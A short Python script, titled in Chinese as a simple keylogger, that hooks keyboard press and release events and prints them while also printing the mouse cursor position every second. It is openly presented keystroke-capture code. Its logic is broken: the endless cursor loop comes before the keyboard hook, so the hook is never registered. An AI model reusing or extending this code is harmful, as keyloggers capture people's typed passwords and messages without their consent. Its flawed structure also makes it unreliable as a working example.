# 简易键盘记录器
import keyboard
import time
from win32api import GetCursorPos

key = {}
def callback(x):
    if x.name in key:
        if x.event_type == "up":
            print(x)
            key.pop(x.name)
    else:
        if x.event_type == "down":
            print(x)
            key[x.name] = 1

while True:
    print(GetCursorPos())
    time.sleep(1)

keyboard.hook(callback)
keyboard.wait()
